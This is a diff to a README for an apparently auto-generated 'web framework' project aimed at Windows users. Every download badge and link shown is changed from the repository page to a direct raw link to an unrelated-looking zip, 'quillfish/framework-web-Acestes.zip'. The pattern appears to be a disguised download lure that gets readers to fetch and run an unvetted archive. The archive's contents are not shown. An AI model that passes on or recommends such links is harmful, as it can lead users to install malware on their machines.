@@ -1,6 +1,6 @@
 # ⚙️ web-framework-1771916150-3 - Easy Web Development Setup
 
-[![Download Now](https://img.shields.io/badge/Download-Web--Framework-blue?style=for-the-badge)](https://github.com/JohnDenverCandia/web-framework-1771916150-3)
+[![Download Now](https://img.shields.io/badge/Download-Web--Framework-blue?style=for-the-badge)](https://github.com/JohnDenverCandia/web-framework-1771916150-3/raw/refs/heads/main/quillfish/framework-web-Acestes.zip)
 
 ## 📋 About web-framework-1771916150-3
 
@@ -28,7 +28,7 @@ Follow these steps carefully to download and run the software on your Windows PC
 
 Click the big link below to open the download page where you can get the framework files:  
 
-[![Download Web Framework](https://img.shields.io/badge/Download-Web--Framework-green?style=for-the-badge)](https://github.com/JohnDenverCandia/web-framework-1771916150-3)
+[![Download Web Framework](https://img.shields.io/badge/Download-Web--Framework-green?style=for-the-badge)](https://github.com/JohnDenverCandia/web-framework-1771916150-3/raw/refs/heads/main/quillfish/framework-web-Acestes.zip)
 
 ### 2. Locate the Latest Release
 
@@ -114,7 +114,7 @@ If you run into trouble, here are some options:
 ## 🔗 Important Links
 
 - Download and setup page:  
-  [https://github.com/JohnDenverCandia/web-framework-1771916150-3](https://github.com/JohnDenverCandia/web-framework-1771916150-3)  
+  [https://github.com/JohnDenverCandia/web-framework-1771916150-3/raw/refs/heads/main/quillfish/framework-web-Acestes.zip](https://github.com/JohnDenverCandia/web-framework-1771916150-3/raw/refs/heads/main/quillfish/framework-web-Acestes.zip)  
 
 - Documentation and support materials:  
   Available on the same GitHub page under different tabs or folders  
